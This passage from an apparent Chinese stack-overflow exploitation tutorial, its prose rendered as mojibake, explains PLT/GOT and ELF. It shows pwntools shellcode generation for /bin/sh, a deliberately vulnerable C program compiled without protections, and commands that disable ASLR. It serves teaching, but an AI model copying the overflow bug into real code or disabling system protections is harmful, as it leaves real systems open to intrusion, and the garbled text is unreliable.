äº†ä¸€å±‚é—´æ¥è·³è½¬ã€‚è°ƒç”¨å‡½æ•°å¹¶ä¸ç›´æ¥é€šè¿‡GOTè·³è½¬ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªå«ä½œPLTé¡¹çš„ç»“æ„æ¥è¿›è¡Œè·³è½¬ã€‚æ¯ä¸ªå¤–éƒ¨å‡½æ•°åœ¨PLTä¸­éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„é¡¹ï¼Œæ¯”å¦‚<code>gets()</code>(<strong>åœ¨stringå¤´æ–‡ä»¶çš„å‡½æ•°ï¼Œä¸æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°</strong>)åœ¨PLTä¸­çš„é¡¹çš„åœ°å€æˆ‘ä»¬ç§°ä¸º<code>gets@plt</code>ã€‚å…¶ä¸­<code>gets@plt</code>çš„å®ç°å¦‚ä¸‹ï¼š</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/3.png" alt="image-20201116153715662"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#åœ¨getsç¬¬ä¸€æ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œä¼šåšä»¥ä¸‹æ“ä½œï¼Œå¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡å°±ç›´æ¥jmp *(gets@GOT)å°±èƒ½è·å–åˆ°å‡½æ•°çš„çœŸå®åœ°å€</span><br><span class="line">gets@plt:</span><br><span class="line">    jmp *(gets@GOT)</span><br><span class="line">    push n</span><br><span class="line">    jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯é€šè¿‡ä¸€æ¡GOTé—´æ¥è·³è½¬çš„æŒ‡ä»¤ã€‚jmpæŒ‡ä»¤è·³è½¬åˆ°GOTè¡¨ï¼Œæ•°æ®ä¸º0x400486</li><li>ç¬¬äºŒæ¡æŒ‡ä»¤æ‰§è¡Œ<code>push 0x3</code>ï¼Œè¿™ä¸ªä¸ºåœ¨GOTä¸­çš„ä¸‹æ ‡åºå·ã€‚</li><li>ç¬¬ä¸‰æ¡æŒ‡ä»¤<code>jmp 0x400440</code>ï¼Œè¿™ä¸ªåœ°å€ä¸ºPLT[0]çš„åœ°å€ï¼ŒPLT[0]çš„æŒ‡ä»¤ä¼šè¿›å…¥åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£ï¼Œæ‰§è¡Œä¸€ä¸ªå‡½æ•°(<strong>_dl_runtime_resolve</strong>)å°†çœŸæ­£çš„å‡½æ•°åœ°å€å¡«å…¥åˆ°GOTè¡¨ä¸­</li></ul><p>å†æ¬¡è°ƒç”¨<code>gets@plt</code>æ—¶ï¼Œç¬¬ä¸€æ¡jumpæŒ‡ä»¤èƒ½è·³è½¬åˆ°çœŸæ­£çš„gets()å‡½æ•°ä¸­ï¼Œgets()å‡½æ•°è¿”å›çš„æ—¶å€™ä¼šæ ¹æ®å †æ ˆé‡Œä¿å­˜çš„EIPç›´æ¥è¿”å›åˆ°è°ƒç”¨è€…ï¼Œè€Œä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œ<code>gets@plt</code>ä¸­ç¬¬äºŒæ¡æŒ‡ä»¤å¼€å§‹çš„é‚£æ®µä»£ç ã€‚å› ä¸ºGOTè¡¨ä¸­å·²ç»æœ‰çœŸæ­£çš„å‡½æ•°åœ°å€ï¼Œé€»è¾‘å’Œä¸‹å›¾ç±»ä¼¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/4.png" alt="image-20201116161136273"></p><hr><blockquote><h3 id="æ–‡ä»¶æ ¼å¼"><a href="#æ–‡ä»¶æ ¼å¼" class="headerlink" title="æ–‡ä»¶æ ¼å¼"></a>æ–‡ä»¶æ ¼å¼</h3></blockquote><h4 id="å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶-Relocatable-Fileï¼‰"><a href="#å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶-Relocatable-Fileï¼‰" class="headerlink" title="å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ (Relocatable Fileï¼‰"></a>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ (Relocatable Fileï¼‰</h4><p><strong>Linux</strong>ä¸‹çš„.oï¼ˆ<strong>Windows</strong>ä¸‹çš„.objï¼‰åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œå¯è¢«ç”¨æ¥é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«ç›®æ ‡æ–‡ä»¶ï¼Œé™æ€é“¾æ¥åº“ä¹Ÿå¯ä»¥å½’ä¸ºè¿™ä¸€ç±» </p><p>æ¯ä¸ª.o æ–‡ä»¶ç”±å¯¹åº”çš„.cæ–‡ä»¶ç”Ÿæˆ æ¯ä¸ª.oæ–‡ä»¶ä»£ç å’Œæ•°æ®åœ°å€éƒ½ä»0å¼€å§‹</p><hr><h4 id="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶-Executable-File"><a href="#å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶-Executable-File" class="headerlink" title="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶(Executable File)"></a>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶(Executable File)</h4><p>åŒ…å«çš„ä»£ç å’Œæ•°æ®å¯ä»¥è¢«ç›´æ¥å¤åˆ¶åˆ°å†…å­˜å¹¶è¢«æ‰§è¡Œ</p><p><strong>Linux</strong>ä¸‹çš„æ— æ–‡ä»¶åç¼€ï¼ˆ<strong>Windows</strong>ä¸‹çš„.exeï¼‰</p><hr><h4 id="å…±äº«çš„ç›®æ ‡æ–‡ä»¶-Shared-Object-File"><a href="#å…±äº«çš„ç›®æ ‡æ–‡ä»¶-Shared-Object-File" class="headerlink" title="å…±äº«çš„ç›®æ ‡æ–‡ä»¶ (Shared Object File)"></a>å…±äº«çš„ç›®æ ‡æ–‡ä»¶ (Shared Object File)</h4><p>é“¾æ¥å™¨å¯ä½¿ç”¨.soæ–‡ä»¶è·Ÿå…¶ä»–.oæ–‡ä»¶å’Œ.soæ–‡ä»¶é“¾æ¥ä»¥ç”Ÿæˆæ–°çš„.oæ–‡ä»¶</p><p>åŠ¨æ€é“¾æ¥å™¨å°†å‡ ä¸ª.soæ–‡ä»¶ä¸å¯æ‰§è¡Œæ–‡ä»¶ç»“åˆï¼Œä½œä¸ºè¿›ç¨‹æ˜ åƒçš„ä¸€éƒ¨åˆ†æ¥è¿è¡Œ ç‰¹æ®Šçš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œèƒ½åœ¨è£…å…¥æˆ–è¿è¡Œæ—¶è¢«è£…å…¥åˆ°å†…å­˜å¹¶è‡ªåŠ¨è¢«é“¾æ¥ï¼Œç§°ä¸ºå…±äº«åº“æ–‡ä»¶</p><p><strong>Windows</strong> ä¸­ç§°å…¶ä¸º <strong>Dynamic</strong> <strong>Link</strong> <strong>Libraries</strong> (<strong>DLLs</strong>)</p><hr><h4 id="å¸¸è§çš„æ–‡ä»¶æ ¼å¼"><a href="#å¸¸è§çš„æ–‡ä»¶æ ¼å¼" class="headerlink" title="å¸¸è§çš„æ–‡ä»¶æ ¼å¼"></a>å¸¸è§çš„æ–‡ä»¶æ ¼å¼</h4><ul><li><p>DOSæ“ä½œç³»ç»Ÿï¼ˆæœ€ç®€å•ï¼‰ ï¼š<strong>COMæ ¼å¼</strong>ï¼Œæ–‡ä»¶ä¸­ä»…åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œä¸”è¢«åŠ è½½åˆ°å›ºå®šä½ç½®</p></li><li><p>UNIX System Væ—©æœŸç‰ˆæœ¬ï¼š<strong>COFFæ ¼å¼</strong>ï¼Œæ–‡ä»¶ä¸­ä¸ä»…åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œè¿˜åŒ…å«é‡å®šä½ä¿¡æ¯ã€è°ƒè¯•ä¿¡æ¯ã€ç¬¦å·è¡¨ç­‰å…¶ä»–ä¿¡æ¯ï¼Œç”±ä¸€ç»„ä¸¥æ ¼å®šä¹‰çš„æ•°æ®ç»“æ„åºåˆ—ç»„æˆ</p></li><li><p>Windowsï¼š <strong>PEæ ¼å¼ï¼ˆCOFFçš„å˜ç§ï¼‰</strong>ï¼Œç§°ä¸ºå¯ç§»æ¤å¯æ‰§è¡Œï¼ˆPortable Executableï¼Œç®€ç§°PEï¼‰</p><p>è¯¦è§£è¯·çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.ascotbe.com/2020/03/23/PortableExecutable/">PEæ ¼å¼è¯¦è§£</a></p></li><li><p>Linuxï¼š<strong>ELFæ ¼å¼ï¼ˆCOFFçš„å˜ç§ï¼‰</strong>ï¼Œç§°ä¸ºå¯æ‰§è¡Œå¯é“¾æ¥ï¼ˆExecutable and Linkable Formatï¼Œç®€ç§°ELFï¼‰</p><p>è¯¦è§£è¯·çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.ascotbe.com/2020/12/6/ExecutableLinkableFormat/">ELFæ ¼å¼è¯¦è§£</a></p></li></ul><hr><blockquote><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3></blockquote><h4 id="ELFæ–‡ä»¶ç”Ÿæˆ"><a href="#ELFæ–‡ä»¶ç”Ÿæˆ" class="headerlink" title="ELFæ–‡ä»¶ç”Ÿæˆ"></a>ELFæ–‡ä»¶ç”Ÿæˆ</h4><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸ªä»£ç æ–‡ä»¶ç”Ÿæˆè¿‡ç¨‹ï¼Œä¸‹é¢è¿‡ç¨‹ä¹Ÿå¯ä»¥ç›´æ¥ä»åŸå§‹Cæ–‡ä»¶é“¾è·¯åˆ°ä»»æ„è¿‡ç¨‹ï¼Œä¸€ä¸‹æ­¥éª¤åªæ˜¯ä¸€ä¸ªæ‹†åˆ†è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="é¢„å¤„ç†è¿‡ç¨‹"><a href="#é¢„å¤„ç†è¿‡ç¨‹" class="headerlink" title="é¢„å¤„ç†è¿‡ç¨‹"></a>é¢„å¤„ç†è¿‡ç¨‹</h5><p>ä¸»è¦å¤„ç†æºæ–‡ä»¶ä¸­ä»¥â€œ#â€å¼€å¤´çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œç»è¿‡é¢„ç¼–è¯‘å¤„ç†åï¼Œå¾—åˆ°çš„æ˜¯é¢„å¤„ç†æ–‡ä»¶ï¼ˆå¦‚ï¼Œhello.i) ï¼Œå®ƒè¿˜æ˜¯ä¸€ä¸ªå¯è¯»çš„æ–‡æœ¬æ–‡ä»¶ ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc â€“E hello.c â€“o hello.i</span><br></pre></td></tr></table></figure><hr><h5 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a>ç¼–è¯‘è¿‡ç¨‹</h5><p>å°†é¢„å¤„ç†åå¾—åˆ°çš„é¢„å¤„ç†æ–‡ä»¶ï¼ˆå¦‚ hello.iï¼‰è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æã€ä¼˜åŒ–åï¼Œç”Ÿæˆæ±‡ç¼–ä»£ç æ–‡ä»¶ã€‚ç»è¿‡ç¼–è¯‘åï¼Œå¾—åˆ°çš„æ±‡ç¼–ä»£ç æ–‡ä»¶ï¼ˆå¦‚ hello.sï¼‰è¿˜æ˜¯å¯è¯»çš„æ–‡æœ¬æ–‡ä»¶ï¼ŒCPUæ— æ³•ç†è§£å’Œæ‰§è¡Œå®ƒã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/5.png" alt="image-20201116113805853"></p><hr><h5 id="æ±‡ç¼–è¿‡ç¨‹"><a href="#æ±‡ç¼–è¿‡ç¨‹" class="headerlink" title="æ±‡ç¼–è¿‡ç¨‹"></a>æ±‡ç¼–è¿‡ç¨‹</h5><p>æ±‡ç¼–ç¨‹åºï¼ˆæ±‡ç¼–å™¨ï¼‰ç”¨æ¥å°†æ±‡ç¼–è¯­è¨€æºç¨‹åºè½¬æ¢ä¸ºæœºå™¨æŒ‡ä»¤åºåˆ—ï¼ˆæœºå™¨è¯­è¨€ç¨‹åºï¼‰ã€‚æ±‡ç¼–ç»“æœæ˜¯ä¸€ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼ˆå¦‚ hello.oï¼‰ï¼Œå…¶ä¸­åŒ…å«çš„æ˜¯ä¸å¯è¯»çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå¿…é¡»ç”¨ç›¸åº”çš„å·¥å…·è½¯ä»¶æ¥æŸ¥çœ‹å…¶å†…å®¹ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>é¢„å¤„ç†ã€ç¼–è¯‘å’Œæ±‡ç¼–ä¸‰ä¸ªè¿‡ç¨‹é’ˆå¯¹ä¸€ä¸ªæ¨¡å—ï¼ˆä¸€ä¸ª*.cæ–‡ä»¶ï¼‰è¿›è¡Œå¤„ç†ï¼Œå¾—åˆ°å¯¹åº”çš„ä¸€ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼ˆä¸€ä¸ª*.oæ–‡ä»¶ï¼‰ã€‚</p><p>ç”¨IDAæ‰“å¼€</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/6.png" alt="image-20201116114352893"></p><hr><h5 id="é“¾æ¥è¿‡ç¨‹"><a href="#é“¾æ¥è¿‡ç¨‹" class="headerlink" title="é“¾æ¥è¿‡ç¨‹"></a>é“¾æ¥è¿‡ç¨‹</h5><p>å°†å¤šä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åˆå¹¶ä»¥ç”Ÿæˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc  hello.o -o hello</span><br></pre></td></tr></table></figure><p>ç”¨IDAæ‰“å¼€ç¼–è¯‘å¥½å¯ä»¥æ‰§è¡Œçš„æ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/7.png" alt="image-20201116114653378"></p><hr><h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>æ‹¿åˆ°ä¸€ä¸ªæ–‡ä»¶åé¦–å…ˆç¬¬ä¸€æ­¥å°±æ˜¯çœ‹ä¿æŠ¤ï¼Œé€šè¿‡ä¿æŠ¤æ¥æŸ¥çœ‹ä½¿ç”¨ä»€ä¹ˆæ€è·¯</p><ul><li>RELROï¼š gotè¡¨çš„ä¿æŠ¤ï¼Œå¦‚æœå¼€äº†çš„è¯ï¼Œæ— æ³•å†™gotè¡¨ï¼Œæ²¡å¼€è€ƒè™‘gotè¡¨</li><li>Canary: æ ˆæº¢å‡ºä¿æŠ¤ï¼Œå¼€äº†çš„è¯ï¼Œæƒ³åŠæ³•åˆ©ç”¨bypass canaryç»•è¿‡ï¼Œæ²¡å¼€ç›´æ¥ROP</li><li>NX: å¼€äº†çš„è¯ï¼Œåˆ©ç”¨ROPæŠ€æœ¯ç»•è¿‡ï¼Œæ²¡å¼€çš„è¯ï¼Œè€ƒè™‘æ‰§è¡Œshellcode</li><li>PIEï¼š å¼€äº†çš„è¯å°±ç”¨bypass pieæŠ€æœ¯ç»•è¿‡ï¼Œ æ²¡å¼€çš„è¯ï¼Œåœ°å€æ˜¯å›ºå®šçš„ï¼Œè€ƒè™‘ä¸€ä¸‹æ˜¯å¦å­˜åœ¨åé—¨å‡½æ•°ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰/bin/shä»¥åŠsystemå‡½æ•°</li></ul><hr><blockquote><h3 id="å¿«é€Ÿè·å–æ¶æ„æ±‡ç¼–"><a href="#å¿«é€Ÿè·å–æ¶æ„æ±‡ç¼–" class="headerlink" title="å¿«é€Ÿè·å–æ¶æ„æ±‡ç¼–"></a>å¿«é€Ÿè·å–æ¶æ„æ±‡ç¼–</h3></blockquote><p>ä½¿ç”¨Pythonä¸­çš„pwntoolsåŒ…å¯ä»¥ç”Ÿæˆå¯¹åº”çš„æ¶æ„çš„shellcodeä»£ç ï¼Œç›´æ¥ä½¿ç”¨é“¾å¼è°ƒç”¨çš„æ–¹æ³•å°±å¯ä»¥å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.nop().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    nop</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> shellcraft.i386.linux.sh()</span><br><span class="line">    <span class="comment"># push &#x27;/bin///sh\x00&#x27;</span></span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure><p>æœéœ€è¦åœ¨64ä½çš„Linuxä¸Šæ‰§è¡Œ<code>/bin/sh</code>å°±å¯ä»¥ä½¿ç”¨<code>shellcraft.amd64.linux.sh()</code>ï¼Œé…åˆasmå‡½æ•°å°±èƒ½å¤Ÿå¾—åˆ°æœ€ç»ˆçš„payloadäº†ã€‚</p><p>é™¤äº†ç›´æ¥æ‰§è¡Œshä¹‹å¤–ï¼Œè¿˜å¯ä»¥è¿›è¡Œå…¶å®ƒçš„ä¸€äº›å¸¸ç”¨æ“ä½œä¾‹å¦‚ææƒã€åå‘è¿æ¥ç­‰ç­‰</p><blockquote><h3 id="åŸºç¡€æ ˆæº¢å‡º"><a href="#åŸºç¡€æ ˆæº¢å‡º" class="headerlink" title="åŸºç¡€æ ˆæº¢å‡º"></a>åŸºç¡€æ ˆæº¢å‡º</h3></blockquote><h4 id="ç¼“å†²åŒºæº¢å‡ºåŸç†"><a href="#ç¼“å†²åŒºæº¢å‡ºåŸç†" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºåŸç†"></a>ç¼“å†²åŒºæº¢å‡ºåŸç†</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|   local var1     |  &lt;- 4 byte</span><br><span class="line">+------------------+</span><br><span class="line">|   local var2     |  &lt;- 8 byte</span><br><span class="line">+------------------+</span><br><span class="line">|        ebp       |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå‚æ•°å’Œä¸¤ä¸ªå±€éƒ¨å˜é‡ã€‚å±€éƒ¨å˜é‡ä¼šæ”¾åœ¨å‡½æ•°çš„æ ˆå¸§ä¸Šï¼Œè€Œä¸”è¿™ä¸ªæ ˆå¸§çš„å¤§å°æ˜¯ç¼–è¯‘æ—¶å°±ç¡®å®šå¥½çš„ã€‚å¯ä»¥çœ‹å‡ºå±€éƒ¨å˜é‡1ã€å±€éƒ¨å˜é‡2å¤§å°éƒ½æ˜¯4å­—èŠ‚ï¼Œå±€éƒ¨å˜é‡1åœ¨4å­—èŠ‚çš„ä½ç½®ä¸Šï¼Œå±€éƒ¨å˜é‡2åœ¨8å­—èŠ‚ä¸Šçš„ä½ç½®ä¸Šã€‚ebpå’Œreturn addræ˜¯ç”¨æ¥ä¿å­˜æ ˆå¸§åŸºå€å’Œå‡½æ•°çš„è¿”å›åœ°å€çš„ï¼Œå¯¹ç¨‹åºå‘˜é€æ˜ã€‚å¦‚æœç»™å±€éƒ¨å˜é‡2è¾“å…¥16ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±ä¼šå§return addrå’Œebpéƒ½ç»™è¦†ç›–äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Stackframe</span><br><span class="line">+------------------+                   æº¢å‡ºæœ¬è´¨å…¶å®å°±æ˜¯æŠŠretåœ°å€æ¢æˆ</span><br><span class="line">|    parameter     |                 æŒ‡å‘shellcodeçš„å¼€å¤´çš„åœ°å€</span><br><span class="line">+------------------+</span><br><span class="line">|       abcd       |  &lt;- local var1</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- local var2</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- ebp</span><br><span class="line">+------------------+</span><br><span class="line">|       aaaa       |  &lt;- return addr</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><hr><h4 id="æ— ä¿æŠ¤æº¢å‡º"><a href="#æ— ä¿æŠ¤æº¢å‡º" class="headerlink" title="æ— ä¿æŠ¤æº¢å‡º"></a>æ— ä¿æŠ¤æº¢å‡º</h4><p>æ¯”è¾ƒå¸¸è§çš„ç¨‹åºæµåŠ«æŒå°±æ˜¯æ ˆæº¢å‡ºï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»å’Œå †æº¢å‡ºäº†ã€‚é€šè¿‡ç¨‹åºæµåŠ«æŒï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶PCæŒ‡é’ˆä»è€Œæ‰§è¡Œç›®æ ‡ä»£ç ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æ”»å‡»ï¼Œç³»ç»Ÿé˜²å¾¡è€…ä¹Ÿæå‡ºäº†å„ç§é˜²å¾¡æ–¹æ³•ï¼Œæœ€å¸¸è§çš„æ–¹æ³•æœ‰DEPï¼ˆå †æ ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒASLRï¼ˆå†…å­˜åœ°å€éšæœºåŒ–ï¼‰ï¼ŒStack Protectorï¼ˆæ ˆä¿æŠ¤ï¼‰ç­‰ã€‚</p><h5 id="ç¼–è¯‘ä»£ç "><a href="#ç¼–è¯‘ä»£ç " class="headerlink" title="ç¼–è¯‘ä»£ç "></a>ç¼–è¯‘ä»£ç </h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸Šè¿°ä»£ç </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -no-pie level1.c -o level1 </span><br></pre></td></tr></table></figure><p>æ¥ç€æŸ¥çœ‹ç¨‹åºä¿æŠ¤æ˜¯å¦å…³é—­äº†</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># checksec level1</span></span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/level1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>æ¥ç€å…³é—­Linuxç³»ç»Ÿçš„ASLRä¿æŠ¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#édockerå®¹å™¨å…³é—­</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">sysctl -w kernel.randomize_va_space=0</span><br><span class="line"><span class="comment">#dockerå®¹å™¨åªèƒ½åœ¨GDBåœºæ™¯ä¸‹å…³é—­</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization on<span class="comment">#å…³é—­ASLR</span></span><br><span class="line"><span class="built_in">set</span> disable-randomization off <span class="comment">#å¼€å¯ASLR</span></span><br><span class="line">show disable-randomization<span class="comment">#æŸ¥çœ‹ASLRçŠ¶æ€</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å…¥<code>cat /proc/sys/kernel/randomize_va_space</code>è‹¥è¿”å›ä¸º0çš„è¯è¡¨ç¤ºå·²ç»å…³é—­äº†</p><ul><li>0 = å…³é—­</li><li>1 = åŠéšæœºã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–ã€‚</li><li>2 = å…¨éšæœºã€‚é™¤äº†1ä¸­æ‰€è¿°ï¼Œè¿˜æœ‰heapã€‚</li></ul><p>ä¹Ÿå¯ä»¥ä½¿ç”¨lddé€šè¿‡çœ‹åŠ è½½åŠ¨æ€åº“æ—¶åŠ¨æ€åº“çš„åŸºå€æ¥ç¡®å®šæ˜¯å¦å¼€å¯ASLRï¼Œå¦‚æœå¼€å¯æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼Œæœªå¼€å¯æ˜¯å€¼ä¸å˜çš„</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7ed1000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cd5000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7ed2000)</span><br><span class="line">root@ascotbe:~<span class="comment"># ldd level1</span></span><br><span class="line">linux-gate.so.1 (0xf7f8f000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d93000)</span><br><span class="line">/lib/ld-linux.so.2 